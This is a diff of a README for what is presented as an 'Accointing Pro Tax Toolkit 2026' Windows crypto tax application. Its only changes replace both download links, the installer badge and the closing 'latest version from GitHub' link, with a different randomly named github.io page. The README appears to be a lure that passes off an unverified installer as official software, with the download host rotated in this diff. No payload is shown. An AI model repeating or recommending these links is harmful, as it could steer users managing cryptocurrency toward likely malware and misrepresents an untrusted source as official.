@@ -2,7 +2,7 @@
 
 Welcome to the **Accointing Pro Tax Toolkit 2026**, the definitive Windows desktop application designed to streamline your cryptocurrency tax reporting and portfolio management. This tool provides a comprehensive suite of features for tracking transactions across multiple exchanges, calculating gains/losses, and generating tax-ready reports, offering the functionality of crypto tax software in a full-featured, standalone desktop package.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-007ACC?style=for-the-badge&logo=windows&logoColor=white)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-007ACC?style=for-the-badge&logo=windows&logoColor=white)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside: Key Features
 
@@ -54,4 +54,4 @@ A: The application includes a built-in help manual and a troubleshooting guide i
 
 Get the latest official release of the Accointing Pro Tax Toolkit for 2026.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
